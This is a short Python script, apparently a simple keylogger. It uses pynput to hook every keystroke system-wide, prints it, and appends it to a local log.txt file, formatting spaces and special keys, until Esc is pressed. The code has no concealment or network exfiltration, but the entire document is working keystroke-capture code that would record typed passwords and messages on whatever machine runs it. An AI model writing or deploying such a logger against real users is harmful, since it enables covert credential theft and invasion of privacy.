from pynput.keyboard import Key, Listener

# count = 0
keys = []


def on_press(key):
    # global keys, count
    global keys

    keys.append(key)
    # count += 1
    print("{0} pressed".format(key))

    write_file(keys)
    keys = []

    # if count >= 10:
    #     write_file(keys)
    #     keys = []
    #     count = 0


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find(".space") > 0:
                # print("neee")
                f.write("\n")
            elif k.find(".shift") > 0:
                continue
            elif k[:4] == "Key.":
                # print("anoo")
                # k.replace("Key.", " ")
                f.write(" " + k[4:].upper() + " ")
            else:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

